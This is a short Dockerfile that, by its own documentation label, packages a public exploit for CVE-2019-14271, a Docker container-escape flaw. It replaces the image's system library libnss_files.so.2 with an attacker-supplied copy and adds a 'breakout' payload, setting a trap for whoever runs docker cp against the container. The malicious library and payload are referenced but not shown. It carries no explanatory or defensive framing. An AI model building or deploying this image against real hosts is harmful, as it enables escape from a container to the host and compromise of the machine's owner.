FROM ubuntu:latest

LABEL org.opencontainers.image.authors="LouisLiu"

LABEL org.opencontainers.image.documentation="https://github.com/iridium-soda/CVE-2019-14271_Exploit"

# Cover original .so directly
COPY ./libnss_files.so.2 /lib/x86_64-linux-gnu/libnss_files.so.2

COPY ./breakout /breakout


